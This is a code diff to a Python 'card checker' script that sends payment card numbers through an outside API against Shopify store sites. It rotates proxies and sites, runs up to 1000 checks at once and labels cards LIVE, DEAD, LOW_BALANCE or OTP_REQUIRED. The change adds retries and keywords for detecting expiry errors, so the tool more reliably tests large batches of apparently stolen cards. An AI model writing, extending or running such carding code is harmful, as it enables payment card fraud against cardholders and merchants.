@@ -258,7 +258,21 @@ def classify_response(api_response):
     return "UNKNOWN", "⚠️"
 
 
-async def check_card(session, card, site, proxy_raw):
+NO_RETRY_STATUSES = frozenset(["LIVE", "DEAD", "LOW_BALANCE", "OTP_REQUIRED"])
+
+EXPIRY_KEYWORDS = frozenset([
+    "expired", "expiry", "expiration", "invalid month", "invalid year",
+    "invalid date", "card expired", "card exp", "bad expiry", "bad expiration",
+    "month invalid", "year invalid", "exp date", "exp month", "exp year",
+])
+
+
+def _is_expiry_error(msg):
+    m = msg.lower()
+    return any(k in m for k in EXPIRY_KEYWORDS)
+
+
+async def _do_check(session, card, site, proxy_raw):
     cc = card.get('formatted', '')
     proxy_converted = format_proxy_for_api(proxy_raw) if proxy_raw else ""
     url = f"{SAC_API}/mlsn?cc={cc}&site={site}"
@@ -273,10 +287,8 @@ async def check_card(session, card, site, proxy_raw):
             except:
                 text = await resp.text()
                 text = re.sub(r'<[^>]+>', '', text).strip()[:200]
-                return {
-                    'status': 'ERROR', 'msg': text, 'emoji': '⚠️',
-                    'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'
-                }
+                return {'status': 'ERROR', 'msg': text, 'emoji': '⚠️',
+                        'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
 
             api_response = str(raw.get("Response") or raw.get("response") or raw.get("message") or "").strip()
             price_raw = raw.get("Price") or raw.get("price") or raw.get("amount") or "-"
@@ -300,20 +312,44 @@ async def check_card(session, card, site, proxy_raw):
                 'receipt_id': receipt_id, 'time': str(check_time) if check_time else "-"
             }
     except asyncio.TimeoutError:
-        return {'status': 'TIMEOUT', 'msg': 'Request Timeout (90s)', 'emoji': '⏰', 'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
+        return {'status': 'TIMEOUT', 'msg': 'Request Timeout (90s)', 'emoji': '⏰',
+                'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
     except Exception as e:
-        return {'status': 'EXCEPTION', 'msg': str(e)[:100], 'emoji': '🔥', 'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
+        return {'status': 'EXCEPTION', 'msg': str(e)[:100], 'emoji': '🔥',
+                'price': '-', 'gateway': 'Shopify', 'site': site, 'receipt_id': 'N/A'}
+
+
+MAX_RETRIES = 5
+
+
+async def check_card(session, card, sites, proxies):
+    last_result = None
+    for attempt in range(MAX_RETRIES):
+        site = pick_random_site(sites) if sites else ""
+        proxy = pick_random_proxy(proxies) if proxies else ""
+        result = await _do_check(session, card, site, proxy)
+        last_result = result
+
+        if result['status'] in NO_RETRY_STATUSES:
+            return result
+
+        if result['status'] == 'ERROR' and _is_expiry_error(result.get('msg', '')):
+            return result
+
+        if result['status'] not in ('ERROR', 'TIMEOUT', 'EXCEPTION', 'UNKNOWN'):
+            return result
+
+    return last_result
 
 
 async def check_cards_batch(cards, sites, proxies, concurrency=1000):
     semaphore = asyncio.Semaphore(concurrency)
     connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100, ttl_dns_cache=300, use_dns_cache=True)
+    results = []
 
     async def check_one(card, session):
         async with semaphore:
-            site = pick_random_site(sites) if sites else ""
-            proxy = pick_random_proxy(proxies) if proxies else ""
-            result = await check_card(session, card, site, proxy)
+            result = await check_card(session, card, sites, proxies)
             result['card'] = card.get('formatted', '')
             return result
 
